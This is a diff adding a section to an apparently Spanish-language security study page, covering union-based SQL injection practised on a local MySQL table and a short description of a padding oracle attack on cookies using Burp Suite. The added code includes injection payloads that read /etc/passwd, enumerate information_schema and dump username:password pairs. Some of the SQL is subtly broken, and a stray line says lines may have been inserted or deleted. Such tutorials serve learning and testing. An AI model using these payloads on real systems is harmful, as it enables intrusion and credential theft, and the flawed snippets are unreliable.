@@ -703,6 +703,64 @@ servidor al que se fuerza la conexión.</p>
   <li><em>Manera manual</em></li>
 </ul>
 
+<p>Para entender como funciona la vulnerabilidad debemos intentarlo por nuestra cuenta, primero nos creamos una base de datos
+para jugar</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service mysql start
+mysql <span class="nt">-uroot</span>
+create table Tabla1<span class="o">(</span><span class="nb">id </span>int<span class="o">(</span>2<span class="o">)</span>, username varchar<span class="o">(</span>32<span class="o">)</span>, password<span class="o">(</span>32<span class="o">))</span><span class="p">;</span>
+??? desde aquí hasta ???FIN las líneas pueden haber sido insertadas/borradas
+insert into Tabla1<span class="o">(</span><span class="nb">id</span>, username, password<span class="o">)</span> values <span class="o">(</span>1, <span class="s2">"username"</span>, <span class="s2">"password"</span><span class="o">)</span><span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from Tabla1<span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1<span class="p">;</span> <span class="c">#Selecciona los datos con la id que pongas</span>
+<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1 order by 100<span class="p">;</span><span class="nt">--</span> -<span class="p">;</span> <span class="c">#Hace un ordenamiento de datos en base a la columna 100</span>
+<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1 union <span class="k">select </span>1,2,3,4<span class="p">;</span><span class="nt">--</span> -<span class="p">;</span> <span class="c">#Donde los numeros 1,2,3,4 pueden ser reemplazados por código</span>
+<span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span> <span class="o">=</span> 1 union <span class="k">select</span> @@version, database<span class="o">()</span>, user<span class="o">()</span>, load_file<span class="o">(</span><span class="s1">'/etc/passwd'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+<p>En el código anterior vemos distintos parametros</p>
+
+<p><strong>@@version</strong> : Muestra la versión de la base de datos</p>
+
+<p><strong>database()</strong> : Muestra la base de datos que se está usando</p>
+
+<p><strong>user()</strong> : Nombra el usuario que usa la base de datos</p>
+
+<p><strong>load_file(‘’)</strong> : Carga un archivo que se coloque en las comillas</p>
+
+<p>Para listar la base de datos de manera alternativa podemos usar el siguiente código:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span> 1 union <span class="k">select </span>1,schema_name,3,4 from information_schema.schemata
+</code></pre></div></div>
+
+<p>Para listar las tablas de una base de dato de manera alternativa usamos el siguiente código:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span> 1 union <span class="k">select </span>1,table_name,3,4 from information_schema.tables where table_schema <span class="o">=</span> <span class="s1">'Table1'</span><span class="p">;</span><span class="nt">--</span> -<span class="p">;</span>
+</code></pre></div></div>
+
+<p>Para listar las columnas el siguiente código:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span>1 union <span class="k">select </span>1, column_name,3,4 from information_schema.columns where <span class="nv">table_schema</span><span class="o">=</span><span class="s1">'Table1'</span> and <span class="nv">table_name</span><span class="o">=</span><span class="s1">'Nombre_de_la_tabla'</span> 
+</code></pre></div></div>
+
+<p>Para poder listar los datos que ya sabemos que la base de datos tiene podemos usar el siguiente código:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from Tabla1 where <span class="nb">id</span><span class="o">=</span>1 union <span class="k">select </span>1, concat<span class="o">(</span>username,0x3a,password<span class="o">)</span>,3,4 from Tabla1.<span class="s1">'Nombre_de_la_tabla'</span>
+</code></pre></div></div>
+
+<h2 id="vulnerabilidad-padding-oracle-attack---padbuster">Vulnerabilidad Padding Oracle Attack - Padbuster</h2>
+
+<p>Esta vulnerabilidad no solo se aplica en las páginas web si no en cualquiera que utilice un algoritmo de cifrado de bloques de longitud variable (es decir que necesita usar relleno o padding) y son vulnerables.</p>
+
+<p><a href="https://www.hackplayers.com/2018/10/explotar-padding-oracle-para-obtener-clave.html">Explotar padding oracle para obtener claves de cifrado</a></p>
+
+<ul>
+  <li>Padding Oracle Attack - BurpSuite Bit Flipper Attack</li>
+</ul>
+
+<p>Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.</p>
+
+<p>Con esta función automatiza el ataque y te envía la cookie correcta que buscas.</p>
+
 
         
       </section>
